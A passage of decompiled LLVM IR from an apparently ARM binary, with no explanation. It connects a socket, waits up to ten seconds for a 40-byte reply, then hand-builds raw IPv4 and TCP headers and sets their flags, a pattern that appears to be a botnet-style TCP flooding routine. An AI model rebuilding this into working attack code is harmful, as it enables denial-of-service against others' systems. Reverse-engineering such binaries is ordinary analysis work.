  %v5_c9d0 = or i32 %v4_c9d0, %v3_c9c8
  store i32 %v5_c9d0, i32* %r1.global-to-local, align 4
  %v2_c9d8 = call i32 @llvm.bswap.i32(i32 %v8_c9bc)
  br label %dec_label_pc_c9e0

dec_label_pc_c9e0:                                ; preds = %dec_label_pc_c92c, %dec_label_pc_c980
  %storemerge35 = phi i32 [ %v2_c9d8, %dec_label_pc_c980 ], [ %v7_c974, %dec_label_pc_c92c ]
  store i32 %v3_c88c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c9ec, label %dec_label_pc_cb1c, label %dec_label_pc_c9f4

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c9e0
  store i32 %v3_c88c, i32* %r0.global-to-local, align 4
  store i32 %v8_c8d8, i32* %r1.global-to-local, align 4
  store i32 %v5_ca00, i32* %r3.global-to-local, align 4
  store i32 %v3_ca04113, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ca10

dec_label_pc_ca10:                                ; preds = %dec_label_pc_cb1c, %dec_label_pc_c9f4
  %stack_var_-57.0 = phi i8 [ %v1_cb24, %dec_label_pc_cb1c ], [ %v1_ca08, %dec_label_pc_c9f4 ]
  %storemerge = phi i8 [ %v1_cb1c, %dec_label_pc_cb1c ], [ %v1_ca0c, %dec_label_pc_c9f4 ]
  store i32 %v2_ca10, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ca18 = load i32, i32* @r7, align 4
  store i32 %v0_ca18, i32* %r0.global-to-local, align 4
  %v5_ca1c = call i32 @connect(i32 %v0_ca18, %sockaddr* nonnull %tmp87, i32 16)
  store i32 %v1_c900, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_ca2c, i32* %r2.global-to-local, align 4
  %v2_ca34 = call i32 @time(i32* null)
  store i32 %v2_ca34, i32* %r0.global-to-local, align 4
  store i32 %v2_ca34, i32* %r4.global-to-local, align 4
  store i32 %v3_ca40, i32* %ip.global-to-local, align 4
  %v9_caa0 = icmp eq i32 %tmp42, %storemerge35
  %v4_cac4 = zext i8 %storemerge to i32
  %v4_cac8 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_caa0 to i32
  %v9_cab4 = icmp eq i1 %v9_caa0, false
  %v4_cad0 = mul nuw nsw i32 %v4_cac8, 256
  %v5_cad0 = or i32 %v4_cad0, %v4_cac4
  %v9_cad4 = icmp eq i32 %v5_cad0, %v5_cacc
  br label %dec_label_pc_ca5c

dec_label_pc_ca4c:                                ; preds = %.thread33, %dec_label_pc_cabc, %dec_label_pc_caec, %bb90
  %v2_ca4c = call i32 @time(i32* null)
  %v0_ca50 = load i32, i32* %r4.global-to-local, align 4
  %v2_ca50 = sub i32 %v2_ca4c, %v0_ca50
  store i32 %v2_ca50, i32* %r0.global-to-local, align 4
  %v7_ca54 = icmp eq i32 %v2_ca50, 10
  store i1 %v7_ca54, i1* %cpsr_z.global-to-local, align 1
  %v8_ca58 = icmp sgt i32 %v2_ca50, 10
  br i1 %v8_ca58, label %dec_label_pc_cb00, label %dec_label_pc_ca5c

dec_label_pc_ca5c:                                ; preds = %dec_label_pc_ca4c, %dec_label_pc_ca10
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ca70, i32* %r1.global-to-local, align 4
  store i32 %v2_ca74, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c888, i32* %r0.global-to-local, align 4
  %v10_ca84 = call i32 @recvfrom(i32 %v3_c888, i32* nonnull %stack_var_-332, i32 256, i32 16384, %sockaddr* %tmp88, i32* nonnull %stack_var_-44)
  store i32 %v10_ca84, i32* %r2.global-to-local, align 4
  %v2_ca8c = icmp eq i32 %v10_ca84, -1
  store i1 %v2_ca8c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_ca8c, label %dec_label_pc_cb14, label %dec_label_pc_ca98

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca5c
  store i32 %storemerge35, i32* %lr.global-to-local, align 4
  store i32 %tmp42, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_caac = icmp eq i32 %v10_ca84, 40
  store i1 %v7_caac, i1* %cpsr_z.global-to-local, align 1
  %tmp119 = icmp ult i32 %v10_ca84, 41
  br i1 %tmp119, label %.thread33, label %bb90

.thread33:                                        ; preds = %dec_label_pc_ca98
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ca4c

bb90:                                             ; preds = %dec_label_pc_ca98
  store i1 %v9_cab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cab4, label %dec_label_pc_ca4c, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %bb90
  store i32 %v4_cac0, i32* %r1.global-to-local, align 4
  store i32 %v4_cac4, i32* %ip.global-to-local, align 4
  store i32 %v4_cac8, i32* %r2.global-to-local, align 4
  store i32 %v5_cacc, i32* %r3.global-to-local, align 4
  store i32 %v5_cad0, i32* @r5, align 4
  store i1 %v9_cad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cad4, label %dec_label_pc_cadc, label %dec_label_pc_ca4c

dec_label_pc_cadc:                                ; preds = %dec_label_pc_cabc
  store i32 %v4_cadc, i32* %r2.global-to-local, align 4
  store i32 %v1_cae0, i32* %r3.global-to-local, align 4
  store i1 %v2_cae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cae4, label %dec_label_pc_cb30, label %dec_label_pc_caec

dec_label_pc_caec:                                ; preds = %dec_label_pc_cadc
  store i1 %v2_caec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_caec, label %dec_label_pc_ca4c, label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_caec
  %v0_caf4 = load i32, i32* @r7, align 4
  store i32 %v0_caf4, i32* %r0.global-to-local, align 4
  %v1_caf8 = call i32 @close(i32 %v0_caf4)
  store i32 %v1_caf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c8f4

dec_label_pc_cb00:                                ; preds = %dec_label_pc_ca4c
  %v0_cb00 = load i32, i32* @r7, align 4
  store i32 %v0_cb00, i32* %r0.global-to-local, align 4
  %v1_cb04 = call i32 @close(i32 %v0_cb00)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c91c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c91c, i32* %r0.global-to-local, align 4
  %v2_c920 = icmp eq i32 %v3_c91c, -1
  store i1 %v2_c920, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c91c, i32* @r7, align 4
  br i1 %v2_c920, label %dec_label_pc_cd80, label %dec_label_pc_c92c

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_c8a0
  store i32 %v3_c888, i32* %r0.global-to-local, align 4
  %v1_cb10 = call i32 @close(i32 %v3_c888)
  store i32 %v1_cb10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb14

dec_label_pc_cb14:                                ; preds = %dec_label_pc_ca5c, %dec_label_pc_c6b8, %dec_label_pc_cb0c
  %v29_cb18 = phi i32 [ -1, %dec_label_pc_c6b8 ], [ %v1_cb10, %dec_label_pc_cb0c ], [ 0, %dec_label_pc_ca5c ]
  store i32 %v3_c6b8, i32* %r4.global-to-local, align 4
  ret i32 %v29_cb18

dec_label_pc_cb1c:                                ; preds = %dec_label_pc_c9e0
  %v0_cb1c = call i32 @function_f67c()
  %v1_cb1c = trunc i32 %v0_cb1c to i8
  store i32 %v0_cb1c, i32* %r0.global-to-local, align 4
  %v4_cb20 = sdiv i32 %v0_cb1c, 256
  store i32 %v4_cb20, i32* %r3.global-to-local, align 4
  %v1_cb24 = trunc i32 %v4_cb20 to i8
  br label %dec_label_pc_ca10

dec_label_pc_cb30:                                ; preds = %dec_label_pc_cadc
  %v3_cb30 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cb30, i32* %r4.global-to-local, align 4
  store i32 %v4_c6d8, i32* %r2.global-to-local, align 4
  %v3_cb38 = mul i32 %v3_cb30, 16
  store i32 %v3_cb38, i32* %ip.global-to-local, align 4
  %v3_cb3c = add i32 %v3_cb38, %v4_c6d8
  %v4_cb3c = inttoptr i32 %v3_cb3c to i32*
  store i32 %storemerge35, i32* %v4_cb3c, align 4
  %v0_cb40 = load i32, i32* @r6, align 4
  %v1_cb40 = add i32 %v0_cb40, 4
  %v2_cb40 = inttoptr i32 %v1_cb40 to i32*
  %v3_cb40 = load i32, i32* %v2_cb40, align 4
  %v1_cb4c = and i32 %v3_cb40, 65280
  store i32 %v1_cb4c, i32* %r1.global-to-local, align 4
  %v3_cb50 = mul i32 %v3_cb40, 16777216
  store i32 %v4_c6d8, i32* %r0.global-to-local, align 4
  %v4_cb5c = mul nuw nsw i32 %v1_cb4c, 256
  %v5_cb5c = or i32 %v4_cb5c, %v3_cb50
  store i32 %v5_cb5c, i32* %r2.global-to-local, align 4
  %v1_cb60 = load i32, i32* %ip.global-to-local, align 4
  %v2_cb60 = add i32 %v1_cb60, %v4_c6d8
  store i32 %v2_cb60, i32* %ip.global-to-local, align 4
  %v2_cb64 = call i32 @llvm.bswap.i32(i32 %v3_cb40)
  store i32 %v2_cb64, i32* %r3.global-to-local, align 4
  %v2_cb68 = add i32 %v2_cb60, 4
  %v3_cb68 = inttoptr i32 %v2_cb68 to i32*
  store i32 %v2_cb64, i32* %v3_cb68, align 4
  %v0_cb6c = load i32, i32* @r6, align 4
  %v1_cb6c = add i32 %v0_cb6c, 8
  %v2_cb6c = inttoptr i32 %v1_cb6c to i32*
  %v3_cb6c = load i32, i32* %v2_cb6c, align 4
  store i32 %v3_cb6c, i32* %r0.global-to-local, align 4
  %v1_cb74 = and i32 %v3_cb6c, 65280
  store i32 %v1_cb74, i32* %r1.global-to-local, align 4
  %v3_cb78 = mul i32 %v3_cb6c, 16777216
  %v4_cb80 = mul nuw nsw i32 %v1_cb74, 256
  %v5_cb80 = or i32 %v4_cb80, %v3_cb78
  store i32 %v5_cb80, i32* %r2.global-to-local, align 4
  %v2_cb88 = call i32 @llvm.bswap.i32(i32 %v3_cb6c)
  store i32 %v2_cb88, i32* %r3.global-to-local, align 4
  %v1_cb8c = load i32, i32* %ip.global-to-local, align 4
  %v2_cb8c = add i32 %v1_cb8c, 8
  %v3_cb8c = inttoptr i32 %v2_cb8c to i32*
  store i32 %v2_cb88, i32* %v3_cb8c, align 4
  %v0_cb90 = load i32, i32* @r6, align 4
  %v1_cb90 = inttoptr i32 %v0_cb90 to i32*
  %v2_cb90 = load i32, i32* %v1_cb90, align 4
  %v3_cb94 = udiv i32 %v2_cb90, 65536
  store i32 %v3_cb94, i32* %r2.global-to-local, align 4
  %v3_cb986 = udiv i32 %v2_cb90, 16777216
  store i32 %v3_cb986, i32* %r1.global-to-local, align 4
  %v0_cb9c = load i32, i32* @r5, align 4
  %v3_cb9c = sdiv i32 %v0_cb9c, 256
  store i32 %v3_cb9c, i32* %r3.global-to-local, align 4
  %v1_cba0 = trunc i32 %v3_cb9c to i8
  %v2_cba0 = load i32, i32* %ip.global-to-local, align 4
  %v3_cba0 = add i32 %v2_cba0, 15
  %v4_cba0 = inttoptr i32 %v3_cba0 to i8*
  store i8 %v1_cba0, i8* %v4_cba0, align 1
  %v0_cba4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cba4 = trunc i32 %v0_cba4 to i8
  %v2_cba4 = load i32, i32* %ip.global-to-local, align 4
  %v3_cba4 = add i32 %v2_cba4, 13
  %v4_cba4 = inttoptr i32 %v3_cba4 to i8*
  store i8 %v1_cba4, i8* %v4_cba4, align 1
  %v0_cba8 = load i32, i32* %r2.global-to-local, align 4
  %v1_cba8 = trunc i32 %v0_cba8 to i8
  %v2_cba8 = load i32, i32* %ip.global-to-local, align 4
  %v3_cba8 = add i32 %v2_cba8, 12
  %v4_cba8 = inttoptr i32 %v3_cba8 to i8*
  store i8 %v1_cba8, i8* %v4_cba8, align 1
  %v0_cbac = load i32, i32* @r5, align 4
  %v1_cbac = trunc i32 %v0_cbac to i8
  %v2_cbac = load i32, i32* %ip.global-to-local, align 4
  %v3_cbac = add i32 %v2_cbac, 14
  %v4_cbac = inttoptr i32 %v3_cbac to i8*
  store i8 %v1_cbac, i8* %v4_cbac, align 1
  %v0_cbb0 = load i32, i32* @sl, align 4
  store i32 %v0_cbb0, i32* %r0.global-to-local, align 4
  %v1_cbb4 = call i32* @malloc(i32 %v0_cbb0)
  %v3_cbb4 = ptrtoint i32* %v1_cbb4 to i32
  store i32 %v3_cbb4, i32* %r0.global-to-local, align 4
  store i32 %v4_c6e8, i32* %r1.global-to-local, align 4
  %v3_cbbc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cbbc, i32* %r2.global-to-local, align 4
  %v2_cbc0 = load i32, i32* %r4.global-to-local, align 4
  %v5_cbc0 = mul i32 %v2_cbc0, 4
  %v6_cbc0 = add i32 %v5_cbc0, %v4_c6e8
  %v7_cbc0 = inttoptr i32 %v6_cbc0 to i32*
  store i32 %v3_cbb4, i32* %v7_cbc0, align 4
  %v0_cbc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cbc4 = load i32, i32* %r2.global-to-local, align 4
  %v4_cbc4 = mul i32 %v1_cbc4, 4
  %v5_cbc4 = add i32 %v4_cbc4, %v0_cbc4
  %v6_cbc4 = inttoptr i32 %v5_cbc4 to i32*
  %v7_cbc4 = load i32, i32* %v6_cbc4, align 4
  store i32 %v7_cbc4, i32* @r4, align 4
  %v1_cbc8 = inttoptr i32 %v7_cbc4 to i8*
  %v2_cbc8 = load i8, i8* %v1_cbc8, align 1
  %tmp120 = urem i8 %v2_cbc8, 16
  %v1_cbcc = zext i8 %tmp120 to i32
  %v1_cbd0 = or i32 %v1_cbcc, 64
  store i32 %v1_cbd0, i32* %r3.global-to-local, align 4
  %v1_cbd4 = trunc i32 %v1_cbd0 to i8
  store i8 %v1_cbd4, i8* %v1_cbc8, align 1
  %v0_cbd8 = load i32, i32* @sl, align 4
  %v3_cbd8 = mul i32 %v0_cbd8, 65536
  store i32 %v3_cbd8, i32* %r2.global-to-local, align 4
  %v0_cbdc = load i32, i32* @r4, align 4
  %v1_cbdc = inttoptr i32 %v0_cbdc to i8*
  %v2_cbdc = load i8, i8* %v1_cbdc, align 1
  %v1_cbe4 = urem i32 %v0_cbd8, 256
  %tmp91 = udiv i32 %v0_cbd8, 256
  %v3_cbe8 = urem i32 %tmp91, 256
  %v1_cbec = and i8 %v2_cbdc, -16
  %v4_cbf0 = mul nuw nsw i32 %v1_cbe4, 256
  %v5_cbf0 = or i32 %v4_cbf0, %v3_cbe8
  store i32 %v5_cbf0, i32* %r2.global-to-local, align 4
  %v1_cbf4 = or i8 %v1_cbec, 5
  store i32 %v1_c768, i32* %ip.global-to-local, align 4
  store i32 %v1_cbe4, i32* %r3.global-to-local, align 4
  store i8 %v1_cbf4, i8* %v1_cbdc, align 1
  %v0_cc04 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc04 = trunc i32 %v0_cc04 to i8
  %v2_cc04 = load i32, i32* @r4, align 4
  %v3_cc04 = add i32 %v2_cc04, 3
  %v4_cc04 = inttoptr i32 %v3_cc04 to i8*
  store i8 %v1_cc04, i8* %v4_cc04, align 1
  store i32 %v4_cc08, i32* %r3.global-to-local, align 4
  %v0_cc0c = load i32, i32* %ip.global-to-local, align 4
  %v2_cc0c = icmp eq i32 %v0_cc0c, 0
  store i1 %v2_cc0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_ca38, i32* %r0.global-to-local, align 4
  store i32 %v3_ca40, i32* %r1.global-to-local, align 4
  %v2_cc18 = load i32, i32* @r4, align 4
  %v3_cc18 = add i32 %v2_cc18, 1
  %v4_cc18 = inttoptr i32 %v3_cc18 to i8*
  store i8 %v1_cc18, i8* %v4_cc18, align 1
  store i32 %v4_cc1c, i32* %ip.global-to-local, align 4
  %v0_cc20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cc20, label %bb93, label %bb92

bb92:                                             ; preds = %dec_label_pc_cb30
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb93

bb93:                                             ; preds = %dec_label_pc_cb30, %bb92
  %v0_cc24 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc24 = trunc i32 %v0_cc24 to i8
  %v2_cc24 = load i32, i32* @r4, align 4
  %v3_cc24 = add i32 %v2_cc24, 2
  %v4_cc24 = inttoptr i32 %v3_cc24 to i8*
  store i8 %v1_cc24, i8* %v4_cc24, align 1
  %v0_cc28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cc28, label %.thread10, label %bb94

bb94:                                             ; preds = %bb93
  %v1_cc28 = load i32, i32* %r3.global-to-local, align 4
  %v2_cc28 = trunc i32 %v1_cc28 to i8
  %v3_cc28 = load i32, i32* @r4, align 4
  %v4_cc28 = add i32 %v3_cc28, 6
  %v5_cc28 = inttoptr i32 %v4_cc28 to i8*
  store i8 %v2_cc28, i8* %v5_cc28, align 1
  %v0_cc2c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cc2c.pr, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %bb93, %bb94, %bb95
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_cc34 = load i32, i32* %ip.global-to-local, align 4
  %v1_cc34 = trunc i32 %v0_cc34 to i8
  %v2_cc34 = load i32, i32* @r4, align 4
  %v3_cc34 = add i32 %v2_cc34, 8
  %v4_cc34 = inttoptr i32 %v3_cc34 to i8*
  store i8 %v1_cc34, i8* %v4_cc34, align 1
  %v0_cc38 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc38 = trunc i32 %v0_cc38 to i8
  %v2_cc38 = load i32, i32* @r4, align 4
  %v3_cc38 = add i32 %v2_cc38, 9
  %v4_cc38 = inttoptr i32 %v3_cc38 to i8*
  store i8 %v1_cc38, i8* %v4_cc38, align 1
  %v0_cc3c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cc3c, label %bb97, label %bb96

bb96:                                             ; preds = %.thread10
  %v1_cc3c = load i32, i32* %r2.global-to-local, align 4
  %v2_cc3c = trunc i32 %v1_cc3c to i8
  %v3_cc3c = load i32, i32* @r4, align 4
  %v4_cc3c = add i32 %v3_cc3c, 7
  %v5_cc3c = inttoptr i32 %v4_cc3c to i8*
  store i8 %v2_cc3c, i8* %v5_cc3c, align 1
  br label %bb97

bb97:                                             ; preds = %.thread10, %bb96
  %v2_cc44 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_cc44, i32* %r3.global-to-local, align 4
  %v1_cc48 = load i32, i32* @r4, align 4
  %v2_cc48 = add i32 %v1_cc48, 12
  %v3_cc48 = inttoptr i32 %v2_cc48 to i32*
  store i32 %v2_cc44, i32* %v3_cc48, align 4
  %v0_cc4c = load i32, i32* %r0.global-to-local, align 4
  %v1_cc4c = trunc i32 %v0_cc4c to i8
  %v2_cc4c = load i32, i32* @r4, align 4
  %v3_cc4c = add i32 %v2_cc4c, 4
  %v4_cc4c = inttoptr i32 %v3_cc4c to i8*
  store i8 %v1_cc4c, i8* %v4_cc4c, align 1
  %v3_cc50 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cc50, i32* %r2.global-to-local, align 4
  store i32 %v4_c6d8, i32* %r0.global-to-local, align 4
  %v4_cc58 = mul i32 %v3_cc50, 16
  %v5_cc58 = add i32 %v4_cc58, %v4_c6d8
  %v6_cc58 = inttoptr i32 %v5_cc58 to i32*
  %v7_cc58 = load i32, i32* %v6_cc58, align 4
  store i32 %v7_cc58, i32* %r3.global-to-local, align 4
  %v0_cc5c = load i32, i32* %r1.global-to-local, align 4
  %v1_cc5c = trunc i32 %v0_cc5c to i8
  %v2_cc5c = load i32, i32* @r4, align 4
  %v3_cc5c = add i32 %v2_cc5c, 5
  %v4_cc5c = inttoptr i32 %v3_cc5c to i8*
  store i8 %v1_cc5c, i8* %v4_cc5c, align 1
  %v0_cc60 = load i32, i32* %r3.global-to-local, align 4
  %v1_cc60 = load i32, i32* @r4, align 4
  %v2_cc60 = add i32 %v1_cc60, 16
  %v3_cc60 = inttoptr i32 %v2_cc60 to i32*
  store i32 %v0_cc60, i32* %v3_cc60, align 4
  %v0_cc64 = load i32, i32* %r2.global-to-local, align 4
  %v3_cc64 = mul i32 %v0_cc64, 16
  %v1_cc68 = load i32, i32* %r0.global-to-local, align 4
  %v2_cc68 = add i32 %v1_cc68, %v3_cc64
  store i32 %v2_cc68, i32* %r2.global-to-local, align 4
  %v1_cc6c = add i32 %v2_cc68, 13
  %v2_cc6c = inttoptr i32 %v1_cc6c to i8*
  %v3_cc6c = load i8, i8* %v2_cc6c, align 1
  %v4_cc6c = zext i8 %v3_cc6c to i32
  store i32 %v4_cc6c, i32* %r1.global-to-local, align 4
  %v1_cc70 = add i32 %v2_cc68, 12
  %v2_cc70 = inttoptr i32 %v1_cc70 to i8*
  %v3_cc70 = load i8, i8* %v2_cc70, align 1
  %v4_cc70 = zext i8 %v3_cc70 to i32
  %v4_cc74 = mul nuw nsw i32 %v4_cc6c, 256
  %v5_cc74 = or i32 %v4_cc70, %v4_cc74
  store i32 %v5_cc74, i32* %r3.global-to-local, align 4
  %v2_cc78 = load i32, i32* @r4, align 4
  %v3_cc78 = add i32 %v2_cc78, 20
  %v4_cc78 = inttoptr i32 %v3_cc78 to i8*
  store i8 %v3_cc70, i8* %v4_cc78, align 1
  %v0_cc7c = load i32, i32* @r4, align 4
  %v1_cc7c = add i32 %v0_cc7c, 20
  store i32 %v1_cc7c, i32* @r6, align 4
  %v0_cc80 = load i32, i32* %r3.global-to-local, align 4
  %v3_cc80 = sdiv i32 %v0_cc80, 256
  store i32 %v3_cc80, i32* %r3.global-to-local, align 4
  %v1_cc84 = trunc i32 %v3_cc80 to i8
  %v3_cc84 = add i32 %v0_cc7c, 21
  %v4_cc84 = inttoptr i32 %v3_cc84 to i8*
  store i8 %v1_cc84, i8* %v4_cc84, align 1
  %v0_cc88 = load i32, i32* @r6, align 4
  %v1_cc88 = add i32 %v0_cc88, 13
  %v2_cc88 = inttoptr i32 %v1_cc88 to i8*
  %v3_cc88 = load i8, i8* %v2_cc88, align 1
  %v4_cc88 = zext i8 %v3_cc88 to i32
  store i32 %v4_cc88, i32* %r3.global-to-local, align 4
  %v0_cc8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cc8c = add i32 %v0_cc8c, 8
  %v2_cc8c = inttoptr i32 %v1_cc8c to i32*
  %v3_cc8c = load i32, i32* %v2_cc8c, align 4
  store i32 %v3_cc8c, i32* %r1.global-to-local, align 4
  %v1_cc90 = or i32 %v4_cc88, 1
  store i32 %v1_cc90, i32* %r3.global-to-local, align 4
  %v1_cc94 = add i32 %v0_cc8c, 15
  %v2_cc94 = inttoptr i32 %v1_cc94 to i8*
  %v3_cc94 = load i8, i8* %v2_cc94, align 1
  %v4_cc94 = zext i8 %v3_cc94 to i32
  store i32 %v4_cc94, i32* %ip.global-to-local, align 4
  %v1_cc98 = add i32 %v0_cc8c, 14
  %v2_cc98 = inttoptr i32 %v1_cc98 to i8*
  %v3_cc98 = load i8, i8* %v2_cc98, align 1
  %v4_cc98 = zext i8 %v3_cc98 to i32
  store i32 %v4_cc98, i32* %r0.global-to-local, align 4
  %v2_cc9c = add i32 %v0_cc88, 4
  %v3_cc9c = inttoptr i32 %v2_cc9c to i32*
  store i32 %v3_cc8c, i32* %v3_cc9c, align 4
  %v0_cca0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cca0 = add i32 %v0_cca0, 4
  %v2_cca0 = inttoptr i32 %v1_cca0 to i32*
  %v3_cca0 = load i32, i32* %v2_cca0, align 4
  store i32 %v3_cca0, i32* %lr.global-to-local, align 4
  %v0_cca4 = load i32, i32* %r3.global-to-local, align 4
  %v1_cca4 = trunc i32 %v0_cca4 to i8
  %v2_cca4 = load i32, i32* @r6, align 4
  %v3_cca4 = add i32 %v2_cca4, 13
  %v4_cca4 = inttoptr i32 %v3_cca4 to i8*
  store i8 %v1_cca4, i8* %v4_cca4, align 1
  %v0_cca8 = load i32, i32* @r6, align 4
  %v1_cca8 = add i32 %v0_cca8, 12
  %v2_cca8 = inttoptr i32 %v1_cca8 to i8*
  %v3_cca8 = load i8, i8* %v2_cca8, align 1
  %v4_cca8 = zext i8 %v3_cca8 to i32
  store i32 %v4_cca8, i32* %r2.global-to-local, align 4
  %v1_ccac = add i32 %v0_cca8, 13
  %v2_ccac = inttoptr i32 %v1_ccac to i8*
  %v3_ccac = load i8, i8* %v2_ccac, align 1
  %v4_ccac = zext i8 %v3_ccac to i32
  %v0_ccb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_ccb0 = load i32, i32* %ip.global-to-local, align 4
  %v4_ccb0 = mul i32 %v1_ccb0, 256
  %v5_ccb0 = or i32 %v4_ccb0, %v0_ccb0
  store i32 %v5_ccb0, i32* %r0.global-to-local, align 4
  %tmp121 = urem i8 %v3_cca8, 16
  %v1_ccb4 = zext i8 %tmp121 to i32
  %v3_ccb8 = sdiv i32 %v5_ccb0, 256
  store i32 %v3_ccb8, i32* %r1.global-to-local, align 4
  %v1_ccbc = or i32 %v1_ccb4, 128
  store i32 %v1_ccbc, i32* %r2.global-to-local, align 4
  %v1_ccc0 = or i32 %v4_ccac, 16
  store i32 %v1_ccc0, i32* %r3.global-to-local, align 4
  %v1_ccc4 = trunc i32 %v3_ccb8 to i8
  %v3_ccc4 = add i32 %v0_cca8, 3
  %v4_ccc4 = inttoptr i32 %v3_ccc4 to i8*
  store i8 %v1_ccc4, i8* %v4_ccc4, align 1
  %v0_ccc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccc8 = trunc i32 %v0_ccc8 to i8
  %v2_ccc8 = load i32, i32* @r6, align 4
  %v3_ccc8 = add i32 %v2_ccc8, 12
  %v4_ccc8 = inttoptr i32 %v3_ccc8 to i8*
  store i8 %v1_ccc8, i8* %v4_ccc8, align 1
  %v0_cccc = load i32, i32* %r3.global-to-local, align 4
  %v1_cccc = trunc i32 %v0_cccc to i8
  %v2_cccc = load i32, i32* @r6, align 4
  %v3_cccc = add i32 %v2_cccc, 13
  %v4_cccc = inttoptr i32 %v3_cccc to i8*
  store i8 %v1_cccc, i8* %v4_cccc, align 1
  %v0_ccd0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ccd0 = load i32, i32* @r6, align 4
  %v2_ccd0 = add i32 %v1_ccd0, 8
  %v3_ccd0 = inttoptr i32 %v2_ccd0 to i32*
  store i32 %v0_ccd0, i32* %v3_ccd0, align 4
  %v0_ccd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_ccd4 = trunc i32 %v0_ccd4 to i8
  %v2_ccd4 = load i32, i32* @r6, align 4
  %v3_ccd4 = add i32 %v2_ccd4, 2
  %v4_ccd4 = inttoptr i32 %v3_ccd4 to i8*
  store i8 %v1_ccd4, i8* %v4_ccd4, align 1
  %v0_ccd8 = call i32 @function_f67c()
  %v1_ccd8 = trunc i32 %v0_ccd8 to i8
  store i32 %v0_ccd8, i32* %r0.global-to-local, align 4
  store i32 %v1_c7a0, i32* %r1.global-to-local, align 4
  %v0_cce0 = load i32, i32* @r6, align 4
  %v1_cce0 = add i32 %v0_cce0, 13
  %v2_cce0 = inttoptr i32 %v1_cce0 to i8*
  %v3_cce0 = load i8, i8* %v2_cce0, align 1
  %v4_cce0 = zext i8 %v3_cce0 to i32
  store i32 %v1_cce4, i32* %r2.global-to-local, align 4
  %v1_cce8 = and i32 %v4_cce0, 223
  %v5_ccec = or i32 %v1_cce8, %v4_ccec
  store i32 %v5_ccec, i32* %r3.global-to-local, align 4
  %v1_ccf0 = trunc i32 %v5_ccec to i8
  store i8 %v1_ccf0, i8* %v2_cce0, align 1
  store i32 %v1_c7c0, i32* %ip.global-to-local, align 4
  %v0_ccf8 = load i32, i32* @r6, align 4
  %v1_ccf8 = add i32 %v0_ccf8, 13
  %v2_ccf8 = inttoptr i32 %v1_ccf8 to i8*
  %v3_ccf8 = load i8, i8* %v2_ccf8, align 1
  %v4_ccf8 = zext i8 %v3_ccf8 to i32
  store i32 %v1_ccfc, i32* %r3.global-to-local, align 4
  %v1_cd00 = and i32 %v4_ccf8, 239
  %v5_cd04 = or i32 %v1_cd00, %v4_cd04
  store i32 %v5_cd04, i32* %r2.global-to-local, align 4
  %v1_cd08 = trunc i32 %v5_cd04 to i8
  store i8 %v1_cd08, i8* %v2_ccf8, align 1
  store i32 %v1_c7e0, i32* %r1.global-to-local, align 4
  %v0_cd10 = load i32, i32* @r6, align 4
  %v1_cd10 = add i32 %v0_cd10, 13
  %v2_cd10 = inttoptr i32 %v1_cd10 to i8*
  %v3_cd10 = load i8, i8* %v2_cd10, align 1
  %v4_cd10 = zext i8 %v3_cd10 to i32
  store i32 %v1_cd14, i32* %r2.global-to-local, align 4
  %v1_cd18 = and i32 %v4_cd10, 247
  %v5_cd1c = or i32 %v1_cd18, %v4_cd1c
  store i32 %v5_cd1c, i32* %r3.global-to-local, align 4
  %v1_cd20 = trunc i32 %v5_cd1c to i8
  store i8 %v1_cd20, i8* %v2_cd10, align 1
